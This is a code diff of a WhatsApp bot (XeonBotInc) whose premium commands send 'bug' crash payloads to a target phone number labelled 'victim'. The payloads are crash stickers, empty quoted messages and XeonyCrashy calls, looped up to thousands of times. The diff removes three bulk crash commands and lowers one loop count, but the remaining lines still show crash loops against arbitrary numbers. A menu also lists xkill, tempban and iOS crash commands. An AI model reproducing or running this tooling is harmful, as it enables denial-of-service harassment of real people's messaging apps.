@@ -1900,7 +1900,7 @@ if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example: ${prefix + command} 5`)
 amount = text * 2
 for (let i = 0; i < amount; i++) {
-await XeonBotInc.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
+await XeonBotInc.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
 }
 }
 break
@@ -1931,7 +1931,7 @@ case 'xlist': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!text) return replygcxeon(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
 victim = text.split("|")[0]+"@s.whatsapp.net"
-amount = text.split("|")[1] * 3000
+amount = text.split("|")[1] * 30
 for (let i = 0; i < amount; i++) {
 await XeonBotInc.sendMessage(victim, { text: '' }, { quoted: xbug2 })
 }
@@ -2128,42 +2128,6 @@ await sleep(3000)
 replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
 }
 break
-case 'xcrash1k':{
-    if (!isPremium) return replygcxeon(mess.prem)
-     if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-     victim = text.split("|")[0]+'@s.whatsapp.net'
-    amount = "1000"
-    for (let i = 0; i < amount; i++) {
-    XeonyCrashy(pushname,victim)
-    await sleep(3000)
-    }
-    replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-    }
-    break
-    case 'xcrash5k':{
-        if (!isPremium) return replygcxeon(mess.prem)
-         if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-         victim = text.split("|")[0]+'@s.whatsapp.net'
-        amount = "5000"
-        for (let i = 0; i < amount; i++) {
-        XeonyCrashy(pushname,victim)
-        await sleep(3000)
-        }
-        replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-        }
-        break
-        case 'xcrash10k':{
-            if (!isPremium) return replygcxeon(mess.prem)
-             if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
-             victim = text.split("|")[0]+'@s.whatsapp.net'
-            amount = "10000"
-            for (let i = 0; i < amount; i++) {
-            XeonyCrashy(pushname,victim)
-            await sleep(3000)
-            }
-            replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-            }
-            break
 case 'xcrash2':
 if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
@@ -2176,7 +2140,7 @@ replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 min
 break
 case 'amountbug': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
+if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
 for (let i = 0; i < amount; i++) {
 const xeonybug1 = `${xeontext1}`
@@ -2529,9 +2493,6 @@ xkill2 <amount>
 xkillgc <link group>
 tempban <code|number>
 xcrash <number>
-xcrash1k <number>
-xcrash5k <number>
-xcrash10k <number>
 xcrash2 <amount>
 xioscrash <number>
 xioscrash2 <amount>
@@ -2636,7 +2597,7 @@ if (typemenu === 'v1') {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://telegra.ph/file/25511c9e1ce4ecaf85a91.jpg',
+                                thumbnailUrl: 'https://i.ibb.co/kSs1stX/thumb.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -2654,7 +2615,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/25511c9e1ce4ecaf85a91.jpg',
+      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
